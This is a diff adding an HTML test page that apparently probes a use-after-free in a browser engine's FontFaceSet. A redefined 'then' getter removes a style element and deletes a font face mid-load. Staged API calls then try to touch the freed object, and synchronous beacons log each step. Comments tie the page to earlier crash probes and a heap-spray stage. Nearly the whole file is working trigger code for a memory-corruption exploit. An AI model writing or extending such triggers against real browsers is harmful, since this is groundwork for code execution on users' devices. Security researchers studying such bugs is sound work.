@@ -1,0 +1,96 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>v901 fontface free test</title>
+<script>
+/* v901: does the FontFaceSet free still happen on 14.22?
+   p563's exact trigger (then-getter removes the victim style + deletes the face,
+   forced layout) but NO ArrayBuffer spray.  After the free we walk the API paths
+   that touch the face's client table; on 14.10 forced iteration crashed the
+   WebProcess (p576 T2).  A crash at any Ti = free exists, reclaim conditions are
+   the problem.  All steps surviving = the free itself is likely gone (patched).
+   Every beacon is a synchronous XHR so it leaves before a crash in the same call. */
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var styleEl = null, firedHere = false, face = null;
+function setup(){
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+  face = A;
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('V901-SETUP');
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      b('V901-GETTER-ENTER');
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      b('V901-FREE-DONE');
+      return undefined;
+    },
+    set: function(){}
+  });
+  b('V901-LOAD-CALLED');
+  document.fonts.load('1em f0, s0', 'AB').then(function(){ b('V901-RESOLVED'); }, function(){ b('V901-REJECTED'); });
+  setTimeout(stages, 60);
+}
+function stages(){
+  try {
+    b('V901-T1-PRE check()');
+    try { document.fonts.check('1em s0'); } catch (e) { b('V901-T1-THREW ' + e.name); }
+    b('V901-T1-OK');
+
+    b('V901-T2-PRE iterate');
+    var n = 0;
+    document.fonts.forEach(function(){ n++; });
+    b('V901-T2-OK n=' + n);
+
+    b('V901-T3-PRE load-again');
+    try { document.fonts.load('1em f0, s0', 'AB').then(function(){ b('V901-T3-RESOLVED'); }, function(){ b('V901-T3-REJECTED'); }); } catch (e) { b('V901-T3-THREW ' + e.name); }
+    b('V901-T3-CALLED');
+
+    b('V901-T4-PRE layout-with-victim');
+    var d = document.createElement('div');
+    d.style.fontFamily = 's0';
+    d.textContent = 'B';
+    document.body.appendChild(d);
+    void d.offsetHeight;
+    b('V901-T4-OK');
+
+    b('V901-T5-PRE second-trigger');
+    var C = new FontFace('f1', 'local(Helvetica)', { unicodeRange: 'U+0043' });
+    document.fonts.add(C);
+    void C.loaded;
+    window.__alive.push(C);
+    var style2 = document.createElement('style');
+    style2.textContent = "@font-face { font-family: s1; src: local(Arial); unicode-range: U+0043; }";
+    document.head.appendChild(style2);
+    var fired2 = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function(){
+        if (fired2) return undefined;
+        fired2 = true;
+        style2.remove();
+        try { document.fonts.delete(this); } catch (e) {}
+        document.body.offsetHeight;
+        return undefined;
+      },
+      set: function(){}
+    });
+    document.fonts.load('1em f1, s1', 'C').then(function(){}, function(){});
+    b('V901-T5-CALLED');
+
+    b('V901-ALIVE free-tests-survived');
+  } catch (e) {
+    b('V901-STAGE-ERR ' + e.name);
+  }
+}
+function run(){ setup(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>v901 fontface free test</p></body></html>
